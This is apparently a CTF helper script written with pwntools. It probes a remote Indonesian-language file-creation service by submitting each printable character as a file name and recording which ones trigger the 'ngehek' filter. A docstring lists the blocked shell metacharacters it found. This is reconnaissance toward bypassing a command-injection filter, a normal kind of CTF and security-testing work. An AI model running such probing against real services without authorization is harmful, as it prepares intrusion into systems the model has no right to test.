from pwn import *
import sys


def init():
    p = remote(sys.argv[1], sys.argv[2])
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p
        
    def option(self, opt):
        p = self.p
        p.sendlineafter(b">>> Masukkan opsi: ", str(opt).encode())

    def tambah_file(self, file_name, content=None):
        p = self.p
        self.option(1)
        p.sendlineafter(b"[*] Masukkan nama file ygy: ", file_name)
        if content:
            p.sendlineafter(b"[*] Tulis isinya ya ges: (ketik 'WES' ketika sudah selesai)", content)
        

def check_blacklist():
    """
    badchar:
    ['!', '"', '#', '$', '%', '&', "'", '(', ')', '*',
    ',', '/', ':', ';', '<', '>', '?', '@', '[', '\\',
    ']', '^', '`', '{', '|', '}', '~', '\t', '\r', '\x0b', '\x0c']
    whitechar:
    ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
    'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
    'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D',
    'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
    'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
    'Y', 'Z', '+', '-', '.', '=', '_', ' ', '\n']
    """
    print("[*] checking...")
    with context.silent:
        badchar = []
        whitechar = []
        for char in string.printable:
            x, p = init()
            x.tambah_file(char.encode())
            a = p.recvline(1000).decode()
            print(a)
            if "ngehek" in a:
                badchar.append(char)
            else:
                whitechar.append(char)
        print(badchar)
        print(whitechar)
            

    
check_blacklist()